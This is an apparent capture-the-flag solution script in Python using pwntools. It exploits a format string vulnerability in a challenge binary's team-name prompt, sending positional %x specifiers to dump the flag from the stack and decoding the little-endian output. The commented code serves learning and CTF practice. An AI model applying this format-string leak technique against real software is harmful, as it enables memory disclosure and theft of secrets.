#!/env/bin python

from pwn import *

context(arch='i386', os='linux')

# Challenge hosted at hack.bckdr.in 8004

if 'HOST' in args:
    r = remote(args['HOST'], int(args['PORT']))
else:
    l = listen(0)
    l.spawn_process(['./team'])
    r = remote('localhost', l.lport)

# To start, disassembling the program reveals a format string
# vulnerability when it prints the team name.
# After much trial and error and not doing anything right at all,
# I noticed that using many %x.%x.%x.%x.....%x would essentially 
# dump the stack for you. Because I had a poor flag locally,
# (a flag.txt file is needed in the same directory to do this chal)
# that wasn't extrememly noticable, it took me a long time to realize
# the flag was being dumped to the terminal. It was just in little endian
# and hex. So copy the values from the output, reverse each byte,
# convert to ascii and you've got the flag. By observing where your
# local flag was located in the spit out garbage, you can see
# about where it should be when performed on the server. 

# By observing where your flag was located on the stack, you could see 
# it was 10 addresses away. Therefore, using %10$x would cause the 10th 
# value on the stack to be printed. We now can hardcode exactly where 
# the flag will be. The flag is printed in hex, there are 256 bits in 
# the flag (i.e. 32 bytes or 64 hex characters) so we will need to use 
# 16 %x's.

teamname = "%10$x.%11$x.%12$x.%13$x.%14$x.%15$x.%16$x.%17$x.%18$x.%19$x.%20$x.%21$x.%22$x.%23$x.%24$x.%25$x"

flag = "Doesn't matter"

r.recvuntil("Enter teamname:")

print "[*] Sending teamname"
r.send(teamname + "\n")

r.recvuntil("Enter flag:")
print "[*] Sending flag"
r.send(flag + "\n")

print "[*] Receiving the dumped stack"
flag = r.recvuntil(":")

# print "[*] Received: "
# print flag

# Remove the unwanted spaces and colon and then split on the '.'
# This gives us a nice list of all the words dumped off the stack
f = flag.replace(" ", "").replace(":", "").split(".")

flag = ""
for i in f:
	# The values are backwards on the stack due to
	# endianness. We can use pwntools' p32() here 
	# to get the flag values. We could optionally 
	# hex decode the string and then invert it like
	# so: flag += str(i.decode("hex")[::-1]) but I
	# like pwntools so we'll use that.
	flag += str(p32(int(i, 16)))

print "[*] Flag: " + flag